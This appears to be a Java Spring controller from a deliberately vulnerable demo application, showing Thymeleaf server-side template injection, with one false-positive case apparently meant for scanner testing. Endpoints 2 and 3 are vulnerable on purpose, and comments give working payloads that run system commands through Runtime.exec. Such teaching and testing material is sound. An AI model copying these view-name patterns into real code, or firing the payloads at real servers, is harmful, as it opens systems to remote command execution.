package com.example.vulnerablejava.controller;

import java.io.IOException;

import javax.servlet.http.HttpServletResponse;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;

import com.example.vulnerablejava.entity.Image;

import io.swagger.annotations.Api;
import io.swagger.annotations.ApiOperation;

@Api(tags = "Thymeleaf注入漏洞")
@Controller
@RequestMapping("/thymeleaf")
public class ThymeleafController {
    /**
     * 渲染文件用法
     */
    @ApiOperation("渲染文件")
    @GetMapping("1")
    public String thymeleaf1(Model model, String name) {
        if (name==null || "".equals(name)) {
            name="test.jpg";
        }
        Image image = new Image();
        image.setName(name);
        image.setUrl("https://www.example.com/");
        model.addAttribute("image", image);
        return "index.html";
    }

    /**
     * 存在漏洞，thymeleaf-spring<=3.0.12时(例如: <spring-boot.version>2.5.7</spring-boot.version>)，存在SSTI漏洞
     * 攻击者传入如下payload即可执行系统命令
     * ?name=__%24%7BT(java.lang.Runtime).getRuntime().exec(%22open%20-a%20Calculator%22)%7D__%3A%3A.x
     * 或
     * ?name=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%27whoami%27).getInputStream()).next()%7d__::.x
     */
    @ApiOperation("存在漏洞")
    @GetMapping("2")
    public String thymeleaf2(String name) {
        return name;
    }

    /**
     * 存在漏洞
     * 根据springboot定义，如果controller无返回值，则以GetMapping的路由为视图名称，即将请求的url作为视图名称
     * 所以如果可以控制path，也可以进行漏洞利用
     * 攻击者访问如下路径，即可执行任意命令
     * /thymeleaf/3/__%24%7BT(java.lang.Runtime).getRuntime().exec("open%20-a%20Calculator")%7D__%3A%3A.x
     */
    @ApiOperation("存在Thymeleaf SSTI漏洞, 路由路径可控导致")
    @GetMapping("3/{name}")
    public void thymeleaf3(@PathVariable String name) {
        System.out.println("Access thymeleaf3");
    }

    /**
     * 误报案例，controller参数包含HttpServletResponse，Spring会认为它已经处理了HTTP Response，因此不会发生视图名称解析，所以不存在漏洞
     */
    @ApiOperation("误报案例")
    @GetMapping("4/{name}")
    public void thymeleaf4(@PathVariable String name, HttpServletResponse response) throws IOException {
        response.getWriter().write("Thymeleaf");
    }
}